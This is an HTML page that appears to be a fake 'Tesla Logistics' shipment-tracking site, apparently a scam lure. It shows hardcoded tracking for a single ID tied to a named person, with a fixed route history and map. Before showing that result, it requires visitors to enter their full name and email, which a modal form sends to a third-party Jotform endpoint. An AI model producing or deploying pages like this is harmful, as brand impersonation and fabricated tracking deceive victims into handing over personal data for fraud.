<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tesla Logistics | Autonomous Network</title>
    
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

    <style>
        :root { --tesla-red: #cc0000; --tesla-dark: #171a20; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; margin: 0; color: #393c41; background: #fff; -webkit-tap-highlight-color: transparent; }
        
        /* Mobile-First Header */
        nav { display: flex; justify-content: center; padding: 15px; background: white; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 1000; }
        .logo { font-weight: 700; letter-spacing: 3px; color: var(--tesla-dark); }
        
        .page { display: none; padding: 20px; box-sizing: border-box; }
        .active { display: block; animation: fadeIn 0.3s ease-in; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* Hero / Search */
        .hero { background: #000; color: white; padding: 40px 20px; text-align: center; border-radius: 0 0 25px 25px; }
        .search-box { background: white; border-radius: 10px; display: flex; flex-direction: column; margin-top: 20px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .search-box input { border: none; padding: 18px; font-size: 1rem; outline: none; text-align: center; }
        .search-box button { background: var(--tesla-red); color: white; border: none; padding: 16px; font-weight: bold; font-size: 1rem; }

        /* Tracking Receipt */
        .receipt { border: 1px solid #eee; padding: 20px; border-radius: 15px; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        #map { height: 220px; width: 100%; border-radius: 10px; margin-bottom: 15px; border: 1px solid #ddd; }

        /* Modal Overlay */
        #email-modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center; backdrop-filter: blur(5px); }
        .modal-box { background: white; padding: 25px; border-radius: 20px; width: 85%; max-width: 380px; text-align: center; box-sizing: border-box; }
        .modal-box input { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; box-sizing: border-box; }
    </style>
</head>
<body>

    <nav><div class="logo">TESLA LOGISTICS</div></nav>

    <div id="email-modal">
        <div class="modal-box">
            <h3 style="margin-top:0;">Digital Manifest</h3>
            <p style="font-size:0.9rem; color:#666; margin-bottom:20px;">Confirm details to receive your official receipt via email.</p>
            
            <form action="https://submit.jotform.com/submit/260152595945565/" method="POST" onsubmit="return handleFormSubmit()">
                <input type="text" name="q3_name" placeholder="Full Name" required>
                <input type="email" name="q4_email" placeholder="Email Address" required>
                <input type="hidden" name="q5_trackingId" id="hidden-track-id">
                
                <button type="submit" style="width:100%; background:black; color:white; padding:15px; border-radius:10px; border:none; font-weight:bold; font-size:1rem; margin-top:10px;">SUBMIT & VIEW TRACKING</button>
            </form>
            <p onclick="closeModal()" style="margin-top:18px; color:#999; font-size:0.85rem; cursor:pointer;">Cancel</p>
        </div>
    </div>

    <div id="home" class="page active">
        <div class="hero">
            <h2 style="margin:0;">Secure Tracking</h2>
            <p style="font-size:0.85rem; color:#888; margin-top:5px;">Real-time asset monitoring</p>
            <div class="search-box">
                <input type="text" id="user-track-id" placeholder="TL-78901234">
                <button onclick="checkID()">TRACK ASSET</button>
            </div>
            <p id="err" style="color:#ffcc00; margin-top:12px; font-size:0.8rem; font-weight:600;"></p>
        </div>
    </div>

    <div id="tracking" class="page">
        <div class="receipt">
            <div id="map"></div>
            <div style="display:flex; justify-content:space-between; align-items:center;">
                <h3 style="margin:0; color:var(--tesla-red);">IN TRANSIT</h3>
                <span style="font-size:0.7rem; color:#aaa;">Authenticated Node</span>
            </div>
            <p id="res-consignee" style="margin:10px 0; font-weight:bold;"></p>
            <hr style="border:0; border-top:1px solid #eee; margin:15px 0;">
            <div id="res-timeline" style="font-size:0.85rem; line-height:2.2; color:#555;"></div>
            <button onclick="location.reload()" style="width:100%; margin-top:25px; padding:12px; border:none; background:#f5f5f5; border-radius:10px; font-weight:600;">NEW SEARCH</button>
        </div>
    </div>

    <script>
        const DB = {
            "TL-78901234": {
                name: "Maria Velez Wampl",
                history: ["• Jan 15: Arrived JFK Intl (NY)", "• Jan 13: Departed Denver Hub", "• Jan 12: Picked up Puerto Rico Hub"]
            }
        };

        function checkID() {
            const id = document.getElementById('user-track-id').value.trim();
            if(DB[id]) {
                document.getElementById('hidden-track-id').value = id;
                document.getElementById('email-modal').style.display='flex';
            } else {
                document.getElementById('err').innerText = "TRACKING ID NOT RECOGNIZED";
            }
        }

        function closeModal() { document.getElementById('email-modal').style.display = 'none'; }

        function handleFormSubmit() {
            const id = document.getElementById('user-track-id').value.trim();
            // This lets the form send before the page changes
            setTimeout(() => { renderTracking(id); }, 800);
            return true; 
        }

        function renderTracking(id) {
            closeModal();
            const data = DB[id];
            document.getElementById('res-consignee').innerText = "Consignee: " + data.name;
            document.getElementById('res-timeline').innerHTML = data.history.join('<br>');
            
            document.getElementById('home').classList.remove('active');
            document.getElementById('tracking').classList.add('active');

            // Map Setup
            setTimeout(() => {
                const m = L.map('map', {zoomControl: false, dragging: !L.Browser.mobile}).setView([28, -70], 4);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
                L.polyline([[40,-74], [18,-66]], {color:'red', weight:2, dashArray:'4,4'}).addTo(m);
                L.circleMarker([40,-74], {radius: 4, color: 'red', fillOpacity: 1}).addTo(m);
                L.circleMarker([18,-66], {radius: 4, color: 'black', fillOpacity: 1}).addTo(m);
            }, 100);
        }
    </script>
</body>
</html>
